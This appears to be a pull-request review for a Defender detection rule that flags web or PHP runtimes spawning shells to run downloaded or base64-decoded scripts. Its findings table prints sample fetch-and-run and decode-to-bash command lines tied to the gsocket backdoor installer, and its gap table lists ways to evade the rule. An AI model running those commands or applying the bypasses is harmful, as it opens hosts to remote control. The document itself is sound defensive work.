# REVIEW - DAC-MDE-0099 MDE: Web or app runtime spawns a shell that runs downloaded or decoded script content

## Attribution
Clean-room behavioural rule written from public sources opened on 12 Nov 2026 (IST):
- https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
- https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh
- https://attack.mitre.org/techniques/T1190/
- https://attack.mitre.org/techniques/T1059/004/
- https://attack.mitre.org/techniques/T1105/
- https://attack.mitre.org/techniques/T1505/003/
- https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table

The Microsoft blog's own hunting queries match tool names, hosts, hashes and fixed file names. This rule does not copy them and does not use any IOC as its trigger. No detections.ai content, no employer data, no CrowdStrike console data. Fixtures are synthetic.

## As-is (new)
No rule in this repo matched this behaviour on main at 9a7a7d9 (searched for gsocket, exec -a, GS_ARGS, hidden temp-path execution and touch timestamp options).

## After
New defender rule DAC-MDE-0099 on DeviceProcessEvents. Companion: DAC-CS-0248.

## ATT&CK v19.2
Checked against enterprise-attack-19.2.json: T1190, T1059.004, T1105, T1505.003; tactics initial-access, execution, command-and-control, persistence.

## Existing overlap in this repo
DAC-CS-0245 / DAC-MDE-0096 (open PRs #95/#96) need two behaviour classes from a PHP parent in 10 minutes, so a single curl-to-shell from php-fpm is missed there. DAC-CS-0211 flags any shell from nginx/httpd/apache2 (broad, no php-fpm or lsphp). This rule is narrower and single-event. Those rules are not changed here.

## Bypass / gap table
| Bypass | Why | Mitigation / status |
|---|---|---|
| Download to file, then run in a second command | Two events, no pipe | Covered by DAC-CS-0245 / DAC-MDE-0096 stacking if a second class appears; known gap otherwise |
| Download with python, php -r or perl | Only curl and wget are matched | Known gap |
| Other encodings (xxd, rev, gzip) | Only base64 -d is matched | Known gap |
| Renamed shell | Image/FileName match on shell names | Known gap |

## Unverified
- The exact parent name for mod_php (apache2) and for cPanel LiteSpeed (lsphp) on each sensor build.
- Whether CommandLine keeps quotes and $( ) text as typed.
- Field names come from the MS Learn DeviceProcessEvents schema page; query not run in Advanced Hunting.
- telemetry_validated false.

## Tests
Synthetic fixtures under tests/cases/DAC-MDE-0099/. Each has `"synthetic": true` and `result` "not run". There is no LogScale or Advanced Hunting runner here. As a supplement, the rule's regexes were mirrored in Python and applied to the fixture events. That checks the patterns only, not the query language.

| Fixture | Expect alert | Regex check | Result |
|---|---|---|---|
| malicious_0 | yes | would alert | match |
| malicious_1 | yes | would alert | match |
| malicious_2 | yes | would alert | match |
| benign_3 | no | no alert | match |
| near_miss_4 | no | no alert | match |

## Ponytail findings (applied before PR)
| # | Sev | Finding | Failing input | Fix applied |
|---|---|---|---|---|
| 1 | Must | Draft only matched pipe-to-shell and missed command substitution | `sh -c bash -c "$(curl -fsSL https://gsocket.io/y)" (malicious_0)` | Add $( and backtick branch |
| 2 | Must | Draft missed the encoded variant the blog describes | `echo <b64> | base64 -d | bash (malicious_1)` | Add base64 -d to shell branch |
| 3 | Should | Download without execution from a web app | `curl -s -o /var/www/cache/rates.json (benign_3)` | Require a shell sink, not just curl |
| 4 | Should | Admin installer over SSH | `sshd -> bash curl ... | sh (near_miss_4)` | Parent must be a web or app runtime |

## Reviewer status
pending
